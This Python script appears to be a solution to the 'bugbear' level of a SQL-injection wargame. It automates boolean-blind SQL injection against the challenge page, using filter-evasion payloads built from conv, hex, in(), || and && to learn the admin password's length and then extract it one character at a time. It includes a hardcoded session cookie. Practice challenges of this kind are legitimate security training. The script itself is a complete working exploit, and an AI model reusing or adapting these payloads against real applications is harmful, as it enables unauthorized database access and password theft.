import string
import requests

url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
params={"no" : None}
cookies = {"PHPSESSID" : "1t87momi7f10m7tl6kkv6t0lob"}


#패스워드 길이 구하기
for i in range(30):
    payload="1||conv(hex(left(id,1)),16,10)in(97)&&length(pw)in({})".format(i)
    params["no"]=payload
    print(payload)
    response = requests.get(url,params=params,cookies=cookies)
    if("Hello admin" in response.text):
        print("find the pw_length : ",i)
        break

# 비밀번호 구하기 
flag = ''
for i in range(1,9):
    for j in string.printable:
        payload = "1||conv(hex(left(id,1)),16,10)in(97)&&conv(hex(right(left(pw,{}),1)),16,10)in({})".format(i,ord(j))
        params["no"]= payload
        print(payload)
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello admin" in response.text):
            flag += j
            print("find the pw : ",flag)
            break
print(flag)